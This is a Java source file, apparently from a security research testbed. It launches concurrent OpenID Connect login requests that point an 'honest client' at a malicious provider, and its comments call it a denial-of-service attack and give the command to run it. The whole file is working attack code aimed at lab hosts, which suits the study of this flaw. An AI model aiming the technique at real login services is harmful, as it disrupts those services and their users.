package org.mitre.discovery.web;

import java.io.IOException;

import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.HttpClients;

/**
 * Simply executes a number of concurrent requests to log in to the honest client as part of the denial-of-service
 * attack.
 * <p>
 * You can run this directly from your IDE or through Maven at the root of the malicious-op project using:
 *
 * <pre>
 * mvn exec:java -Dexec.mainClass="org.mitre.discovery.web.DosAttack"
 * </pre>
 *
 * @author amar
 *
 */
public class DosAttack {

    private static final int NUM_REQUESTS = 5;
    private static final String LOGIN_URI = "http://honest-client/honest-client/openid_connect_login?identifier=http%3A%2F%2Fmalicious-op%2Fmalicious-op%2F";

    public static void main(final String[] args) throws ClientProtocolException, IOException, InterruptedException {

        for (int i = 0; i < NUM_REQUESTS; i++) {
            final int curRequest = i + 1;
            new Thread(() -> {
                try {
                    final HttpClient client = HttpClients.createDefault();
                    final HttpGet getRequest = new HttpGet(LOGIN_URI);
                    System.out.println(String.format("Executing request %d of %d", curRequest, NUM_REQUESTS));
                    final HttpResponse response = client.execute(getRequest);
                    System.out.println(
                            String.format("Request %d response status; %s", curRequest, response.getStatusLine()));
                } catch (final Exception e) {
                    e.printStackTrace();
                }
            }).start();
        }
    }
}